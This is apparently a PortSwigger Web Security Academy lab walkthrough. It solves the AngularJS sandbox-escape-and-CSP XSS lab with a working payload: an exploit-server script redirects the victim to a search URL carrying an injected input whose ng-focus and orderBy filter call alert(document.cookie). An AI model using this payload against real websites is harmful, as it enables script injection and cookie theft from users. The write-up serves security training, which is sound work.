## Welcome, my friend. Today we will start the [27. XSS lab](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp) in ```portswigger```
### Let's play this lab:

![image](https://github.com/user-attachments/assets/865ee715-c5cf-474e-ae69-9200a7b8822a)

#### First, we navigate inside the browser

![image](https://github.com/user-attachments/assets/7ab4ead7-dd59-412a-9b43-6e8620483d9a)

### Let's enter html code in body:

```
<h1>hi</h1> <h5>0xT0R</h5>
```

![image](https://github.com/user-attachments/assets/95782d63-e034-4e8a-bbc6-87c286402020)

### Enter ```View exploit```:


![image](https://github.com/user-attachments/assets/a3ca2bd9-fdbf-41d0-9f4f-ffc45e657810)


### Let's enter ```javascript``` code in body:

```
<script>
location='https://0ac400d8031a89ac8368053d001200cb.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

![image](https://github.com/user-attachments/assets/7f09cbf4-04a4-4bff-a23b-c9af23143b98)

### Let's enter on ```store``` then deliver exploit to victim

![image](https://github.com/user-attachments/assets/7140e423-34ae-4cdf-8e44-2406b1924ede)


-------

### Done! Congratulations, friends❤️‍🔥


<p align="center">
<img src="https://github.com/user-attachments/assets/284ebebd-da4f-4c2a-bcb2-04eb0ef8a878" >
</p>
